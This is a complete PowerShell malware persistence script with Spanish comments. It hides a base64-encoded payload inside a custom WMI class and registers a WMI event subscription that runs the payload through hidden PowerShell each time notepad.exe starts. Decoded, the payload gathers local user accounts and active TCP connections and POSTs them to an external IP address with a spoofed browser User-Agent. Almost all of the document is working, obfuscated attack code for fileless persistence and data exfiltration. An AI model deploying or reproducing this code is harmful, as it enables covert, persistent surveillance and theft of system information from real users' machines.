# Estas lineas de codigo pertenecen a la persistencia (injector.ps1)
## Esta sección crea una clase estática llamada "Win32_MyMalware" en el namespace "root\cimv2". Adicionalmente agrega una propiedad estática llamada "GetComputerInfo" la cual tiene por objetivo almacenar el malware.ps1

$newClass = New-Object System.Management.ManagementClass ("root\cimv2", [String]::Empty, $null); 
$newClass["__CLASS"] = "Win32_MyMalware"; 
$newClass.Qualifiers.Add("Static", $true)
$newClass.Properties.Add("GetComputerInfo", [System.Management.CimType]::String, $false)
$newClass.Properties["GetComputerInfo"].Qualifiers.Add("Key", $true)
$newClass.Put()

# Carga malware. Estas lineas de codigo, ingresa el archivo malware.ps1 encodeado en base64. Se coloca en esta propiedad estática con la finalidad de sacar el codigo de acá.
$StaticClass=New-Object Management.ManagementClass('root\cimv2:Win32_MyMalware')
$StaticClass.SetPropertyValue('GetComputerInfo' , "JHVzZXJzID0gR2V0LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3RcY2ltdjIgLUNsYXNzIFdpbjMyX1VzZXJBY2NvdW50IHwgT3V0LXN0cmluZwokdGNwY29ubiA9IG5ldHN0YXQgLWFub3AgdGNwCgokYiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJHVzZXJzICsgIlxuIiArICR0Y3Bjb25uKQokc2VuZGF0YSA9IFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRiKQoKCiRVUkwgPSAiaHR0cDovLzE0Mi45My41OS4yMDo1Njc4LyIgCiR3YyA9IG5ldy1vYmplY3QgbmV0LldlYkNsaWVudAokd2MuSGVhZGVycy5BZGQoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiKQokd2MuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCAiTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDYuMTsgVHJpZGVudC80LjA7IFNMQ0MyOyAuTkVUIENMUiAyLjAuNTA3MjcpIikKCiROVkMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5OYW1lVmFsdWVDb2xsZWN0aW9uCiROVkMuQWRkKCJkYXRhIiwgJHNlbmRhdGEpOwokd2MuUXVlcnlTdHJpbmcgPSAkTlZDCgokUmVzdWx0ID0gJFdDLlVwbG9hZFZhbHVlcygkVVJMLCJQT1NUIiwgJE5WQyk=")
$StaticClass.Put()

# Esta es la parte de la persistencia via WMI
## Esta linea crea un Filtro, el que se gatilla cada vez que el usuario abre el proceso Notepad.exe
$query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'"
$filter = Set-WmiInstance -Class '__EventFilter' -Namespace "root\subscription" -Arguments @{name="MyMalware_filter"; QueryLanguage="WQL"; Query=$query; EventNamespace = "root/cimv2"; }

## Esta linea crea un Consumer, el cual ejecuta un powershell y obtiene el codigo en base64 de la propiedad estática del injector.
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{ Name = "MyMalware_consumer"; CommandLineTemplate = "powershell.exe -NoP -C `"iex ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((([WmiClass] 'root\cimv2:Win32_MyMalware').Properties['GetComputerInfo'].Value))))`"" }

## Esta linea hace el enlace entre nuestro filtro (el trigger) y lo que se realiza (el consumer)
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $filter; Consumer = $consumer }